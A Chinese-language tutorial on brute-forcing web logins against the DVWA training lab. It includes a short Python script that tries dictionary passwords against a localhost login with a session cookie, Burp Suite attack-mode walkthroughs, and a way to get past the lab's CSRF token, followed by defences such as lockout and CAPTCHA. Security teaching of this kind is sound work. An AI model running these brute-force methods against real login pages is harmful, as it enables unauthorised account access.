# WEB漏洞：暴力破解

密码爆破的本质：依赖字典，连续性的，自动化的尝试密码登陆爆破

## 1）密码爆破思路

### 方式一：尝试爆破：假设密码长度6，每位有126种可能。那么需要尝试126^6次。

![image-20211011220925112](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011220925112.png)

![image-20211011221109971](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011221109971.png)

###        方式二：使用字典

​     思考：字典从何而来？ 

```
 参考泄露出来的最长使用的密码排名前200：
 https://nordpass.com/most-common-passwords-list/
 网络下载密码本
 密码生成器
```

![image-20211011222447807](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011222447807.png)

​      

### 方式三：使用POC实现爆破

POC实现爆破，python代码实现爆破：

```
1、读取字典，加载密码
2、发起http连接
3、分析HTTP响应
4、持续自动化爆破
```

代码：

readpass.py

```
# -*- coding: utf-8 -*-
# python 3

pwds = open("password.txt")
for pwd in pwds:
    print(pwd)

pwds.close()
```

httpconn.py

```
# -*- coding: utf-8 -*-
# python 3

import requests

pwds = open("password.txt")
for pwd in pwds:
    url = "http://localhost/DVWA-master/vulnerabilities/brute/"
    # PHPSESSID务必替换为登录以后的PHPSESSID
    resp = requests.get(url = url, params = {"username":"admin", "password":pwd.strip(), "Login":"Login"}, headers = {"Cookie":"security=low; PHPSESSID=0hhidoi7h1ln7jo9h2h0tgfnn6"})
    #print(resp.text)
    if 'Username and/or password incorrect.' in resp.text:
        print('破解失败：'+pwd, end='')
    else:
        print('破解成功：'+pwd, end='')
        break;
pwds.close()
```

## 2） DVWA靶场

### 环境准备：

下载代码： https://dvwa.co.uk/

配置数据库：修改config/config.inc.php

部署到phpstudy

注意是登录以后才可以使用暴破场景，而不是暴破首页的登录功能

## 3）暴力破解实现

### 使用python代码破解DVWA靶场

### 使用工具BP实现爆破

### 4）BP的攻击模式

## 攻击模式一：狙击手

![image-20211011231250903](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011231250903.png)

发起爆破：

![image-20211011231320361](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011231320361.png)

攻击结果：

![image-20211011231632982](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011231632982.png)

### 攻击模式二：攻城锤Battering ram

![image-20211011232151097](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232151097.png)

![image-20211011232217925](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232217925.png)

攻城锤模式，使用一个字典，两个节点的值一样：

![image-20211011232344114](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232344114.png)

### 攻击模式三：草叉模式Pitchfork

![image-20211011232631140](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232631140.png)

选择两个字典：

![image-20211011232217925](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232217925.png)

![image-20211011232724554](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232724554.png)

攻击结果：一共发起10次请求，每一次请求使用第一个字典的第一个值和第二个字典的第一个值匹配，依次类推：

![image-20211011232844736](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232844736.png)

### 攻击模式四：集束炸弹Cluster bomb

![image-20211011233054890](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011233054890.png)

使用两个字典：

![image-20211011232217925](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232217925.png)

![image-20211011232724554](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011232724554.png)

攻击结果：笛卡尔积，一共发起100次请求，爆破成功：

![image-20211011233242799](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011233242799.png)



## 5）防御

### DVWA-medium  ：sleep两秒

![image-20211011234222273](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011234222273.png)

### DVWA-high: 随机sleep 0-3秒   ，  增加CSRF token（客户端请求伪造token）

![image-20211011234311100](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011234311100.png)



BP拦截：

![image-20211011234443227](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011234443227.png)

选择草叉模式：

![image-20211011234703125](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011234703125.png)

加载第一个字典：

![image-20211011234750361](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011234750361.png)

第二个参数，是需要从上一次请求中的token种得到：

设置Options：匹配到前后的正则表达式，那么就是token：

![image-20211011235010768](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011235010768.png)

设置payloads：

![image-20211011235311678](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011235311678.png)

设置单线程：

![image-20211011235430541](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211011235430541.png)

爆破结果：

![image-20211012000528262](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012000528262.png)

添加提示：

![image-20211012000935767](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012000935767.png)

点击Add：

![image-20211012001000306](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001000306.png)

爆破结果：

![image-20211012001317632](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001317632.png)



### Dvwa-impossible：

### 限定次数：输错三次，锁定15分钟

![image-20211012001559780](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001559780.png)



支付宝设置的防御机制：

![image-20211012001659334](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001659334.png)

二次验证加固：

![image-20211012001800429](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001800429.png)

人机识别加固：

![image-20211012002012228](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012002012228.png)

![image-20211012001858314](https://xbxaq.oss-cn-chengdu.aliyuncs.com/typora/image-20211012001858314.png)


